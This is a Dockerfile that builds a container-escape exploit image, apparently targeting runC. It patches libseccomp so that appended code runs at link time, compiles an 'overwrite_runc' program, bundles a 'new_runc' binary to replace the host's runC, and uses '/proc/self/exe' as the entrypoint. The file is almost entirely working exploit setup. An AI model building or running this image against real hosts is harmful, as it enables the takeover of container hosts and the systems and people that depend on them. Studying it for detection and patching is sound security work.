FROM ubuntu:18.04

# Get the libseccomp source code and required build dependecies 
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp

# Append the run_at_link funtion to the libseccomp-2.3.1/src/api.c file and build
ADD run_at_link.c /root/run_at_link.c
RUN set -e -x ;\
    cd /root/libseccomp-* ;\
    cat /root/run_at_link.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb

# Add overwrite_runc.c and compile
ADD overwrite_runc.c /root/overwrite_runc.c
RUN set -e -x ;\
    cd /root ;\
    gcc overwrite_runc.c -o /overwrite_runc

# Add the new_runc file to replace the host runC
ADD new_runc /root/new_runc

# Create a symbolic link to /proc/self/exe and set it as the image entrypoint
RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
ENTRYPOINT [ "/entrypoint" ]
